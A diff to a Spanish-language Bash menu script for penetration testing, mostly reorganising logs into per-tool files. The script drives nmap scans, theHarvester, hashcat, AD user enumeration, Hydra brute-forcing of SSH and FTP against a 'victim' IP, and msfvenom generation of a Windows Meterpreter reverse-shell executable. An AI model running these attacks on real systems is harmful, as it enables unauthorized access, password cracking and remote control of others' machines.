@@ -121,7 +121,6 @@ function generar_reporte() {
     } > "$report_name"
 
     echo "Reporte generado y almacenado en: $report_name"
-    rm "$session_log" 2>/dev/null || echo "No se encontró archivo de sesión."
 
     echo "Proceso completado. Presiona Enter para continuar..."
     read -r
@@ -129,8 +128,12 @@ function generar_reporte() {
     menu_principal
 }
 
+
 function unificar_reportes() {
     echo "Unificando reportes..."
+
+    local unified_dir="reportes_unificados"
+    mkdir -p "$unified_dir"
 
     reportes=(*reporte_*.txt)
 
@@ -139,7 +142,7 @@ function unificar_reportes() {
         return
     fi
 
-    reporte_unificado="reporte_unificado_$(date +"%Y-%m-%d_%H-%M").txt"
+    reporte_unificado="$unified_dir/reporte_unificado_$(date +"%Y-%m-%d_%H-%M").txt"
 
     {
         echo "==== Reporte Unificado ===="
@@ -154,9 +157,6 @@ function unificar_reportes() {
     } > "$reporte_unificado"
 
     echo "Reporte unificado generado: $reporte_unificado"
-    
-    rm "${reportes[@]}"
-    echo "Reportes individuales borrados."
 
     echo "Proceso de unificación completado. Presiona Enter para continuar..."
     read -r
@@ -233,29 +233,42 @@ function ejecutar_herramientas() {
     generar_reporte
 }
 
+
 function nmap_scan_rapido() {
+    nmap_log="$log_dir/nmap_scan_rapido_$(date +"%Y-%m-%d_%H-%M").txt" 
     read -p "Ingresa la IP o rango a escanear: " ip
-    sudo nmap -sP $ip | tee -a "$session_log"
-    echo "Generando reporte..." | tee -a "$session_log"
+    echo "Ejecutando Nmap scan rápido en $ip..." | tee -a "$nmap_log"
+    sudo nmap -sP $ip | tee -a "$nmap_log"
+    
+    echo "Generando reporte..." | tee -a "$nmap_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
+
 
 function nmap_scan_puertos() {
+    nmap_ports_log="$log_dir/nmap_scan_puertos_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa la IP o rango a escanear: " ip
-    sudo nmap -sS $ip | tee -a "$session_log"
-    echo "Generando reporte..." | tee -a "$session_log"
+    echo "Ejecutando Nmap scan de puertos en $ip..." | tee -a "$nmap_ports_log"
+    sudo nmap -sS $ip | tee -a "$nmap_ports_log"
+    
+    echo "Generando reporte..." | tee -a "$nmap_ports_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
 
+
 function osint_harvester() {
+    osint_log="$log_dir/osint_harvester_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa el dominio para el escaneo OSINT: " dominio
-    sudo theHarvester -d $dominio -l 500 -b all | tee -a "$session_log"
-    echo "Generando reporte..." | tee -a "$session_log"
+    echo "Ejecutando TheHarvester en $dominio..." | tee -a "$osint_log"
+    sudo theHarvester -d $dominio -l 500 -b all | tee -a "$osint_log"
+    
+    echo "Generando reporte..." | tee -a "$osint_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_enumeracion
 }
+
 
 function submenu_payloads() {
     clear
@@ -277,15 +290,20 @@ function submenu_payloads() {
 }
 
 function generar_payload() {
+    payload_log="$log_dir/payload_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa tu IP (LHOST): " ip
     read -p "Ingresa el puerto a usar (LPORT): " puerto
+    echo "Generando payload con msfvenom..." | tee -a "$payload_log"
     sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto -f exe > payload.exe
-    echo "Payload generado: payload.exe" | tee -a "$session_log"
-    echo "Payload generado con msfvenom (LHOST: $ip, LPORT: $puerto)" >> "$session_log"
-    echo "Generando reporte..." | tee -a "$session_log"
+    
+    echo "Payload generado: payload.exe" | tee -a "$payload_log"
+    echo "Payload generado con msfvenom (LHOST: $ip, LPORT: $puerto)" >> "$payload_log"
+    
+    echo "Generando reporte..." | tee -a "$payload_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_payloads
 }
+
 
 function crear_reverse_shell() {
     read -p "Ingresa tu IP: " ip
@@ -318,23 +336,29 @@ function submenu_hashes() {
 }
 
 function crackear_hash() {
+    hashcat_log="$log_dir/hashcat_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa el archivo de hashes: " archivo
     read -p "Ingresa el wordlist a usar: " wordlist
-    sudo hashcat -a 0 -m 0 $archivo $wordlist | tee -a "$session_log"
-    echo "Hashcat ejecutado en $archivo con wordlist $wordlist" >> "$session_log"
-    echo "Generando reporte..." | tee -a "$session_log"
+    echo "Ejecutando Hashcat en $archivo con la wordlist $wordlist..." | tee -a "$hashcat_log"
+    sudo hashcat -a 0 -m 0 $archivo $wordlist | tee -a "$hashcat_log"
+    
+    echo "Hashcat ejecutado en $archivo con wordlist $wordlist" >> "$hashcat_log"
+    echo "Generando reporte..." | tee -a "$hashcat_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_hashes
 }
 
+
 function detectar_tipo_hash() {
+    hash_log="$log_dir/hash_detection_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa el hash: " hash
-    sudo hashid -m $hash | tee -a "$session_log"
-    echo "Tipo de hash detectado: $hash" >> "$session_log"
-    echo "Generando reporte..." | tee -a "$session_log"
+    sudo hashid -m $hash | tee -a "$hash_log"
+    echo "Tipo de hash detectado: $hash" >> "$hash_log"
+    echo "Generando reporte..." | tee -a "$hash_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_hashes
 }
+
 
 function submenu_cheatsheets() {
     clear
@@ -380,16 +404,18 @@ function submenu_ad() {
 }
 
 function enumerar_usuarios_ad() {
+    enum_log="$log_dir/enum_user_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa la IP del DC: " dc_ip
     read -p "Ingresa el dominio (domain): " dominio
     read -p "Ingresa el usuario: " usuario
     read -s -p "Ingresa la contraseña: " password
-    echo # Nueva línea para mejor visualización
-    sudo python3 GetADUsers.py -dc-ip "$dc_ip" "$dominio/$usuario:$password"
-    echo "Usuarios enumerados desde $dc_ip" >> "$session_log"
+    echo
+    sudo python3 GetADUsers.py -dc-ip "$dc_ip" "$dominio/$usuario:$password" | tee -a "$enum_log"
+    echo "Usuarios enumerados desde $dc_ip" >> "$enum_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_ad
 }
+
 
 function submenu_fuerza_bruta() {
     clear
@@ -411,6 +437,7 @@ function submenu_fuerza_bruta() {
 }
 
 function ataque_ssh() {
+    ssh_log="$log_dir/ssh_attack_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa la IP de la víctima: " ip
     read -p "Ingresa el archivo de usuarios (deja en blanco para usar el predeterminado): " usuarios
     read -p "Ingresa el archivo de contraseñas (deja en blanco para usar el predeterminado): " contrasenas
@@ -433,8 +460,6 @@ function ataque_ssh() {
         echo "Usando la lista de contraseñas predeterminada: $contrasenas"
     fi
 
-    ssh_log="ssh_attack_log_$(date +"%Y-%m-%d_%H-%M").txt"
-    
     sudo hydra -L "$usuarios" -P "$contrasenas" -t 4 ssh://"$ip" -o "$ssh_log"
     
     if [ -f "$ssh_log" ] && grep -q "login:" "$ssh_log"; then
@@ -449,7 +474,9 @@ function ataque_ssh() {
     read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
 }
 
+
 function ataque_ftp() {
+    ftp_log="$log_dir/ftp_attack_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa la IP de la víctima: " ip
     read -p "Ingresa el archivo de usuarios: " usuarios
     read -p "Ingresa el archivo de contraseñas: " contrasenas
@@ -464,11 +491,12 @@ function ataque_ftp() {
         return
     fi
 
-    sudo hydra -L "$usuarios" -P "$contrasenas" ftp://"$ip"
-    echo "Ataque FTP ejecutado en $ip usando $usuarios y $contrasenas" >> "$session_log"
+    sudo hydra -L "$usuarios" -P "$contrasenas" ftp://"$ip" -o "$ftp_log"
+    echo "Ataque FTP ejecutado en $ip usando $usuarios y $contrasenas. Ver detalles en $ftp_log." >> "$session_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
 }
+
 
 function submenu_subdominios() {
     clear
@@ -488,9 +516,10 @@ function submenu_subdominios() {
 }
 
 function escanear_subdominios() {
+    subdomain_log="$log_dir/subdomain_scan_log_$(date +"%Y-%m-%d_%H-%M").txt"
     read -p "Ingresa el dominio objetivo: " dominio
-    sudo sublist3r -d "$dominio"
-    echo "Escaneo de subdominios ejecutado para $dominio" >> "$session_log"
+    sudo sublist3r -d "$dominio" | tee -a "$subdomain_log"
+    echo "Escaneo de subdominios ejecutado para $dominio. Ver detalles en $subdomain_log." >> "$session_log"
     generar_reporte
     read -p "Presiona Enter para continuar..." && submenu_subdominios
 }
